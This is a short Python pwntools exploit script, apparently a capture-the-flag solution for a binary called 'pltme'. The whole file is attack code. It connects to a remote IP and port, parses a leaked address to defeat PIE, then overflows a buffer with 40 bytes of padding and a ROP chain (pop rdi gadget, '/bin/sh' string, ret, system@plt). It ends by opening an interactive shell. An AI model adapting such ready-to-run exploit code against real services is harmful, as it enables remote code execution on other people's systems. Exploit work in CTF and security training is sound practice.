# coding: utf-8
from pwn import *
elf = ELF("./pltme")
pr = remote("207.154.239.148", 1341)
pr.recvuntil(b"Leak: ")
leak = int(pr.recvline().strip(), 16)
base_addr = leak - (elf.sym.main)
rdi = base_addr + (0x012f3)
ret = base_addr + (0x0101a)
sh = base_addr + (0x0200c)
sys_call = base_addr + (elf.plt.system)
payload = b"a" * 40 + \
p64(rdi) + p64(sh) + p64(ret) + p64(sys_call)
pr.sendline(payload)
pr.interactive()
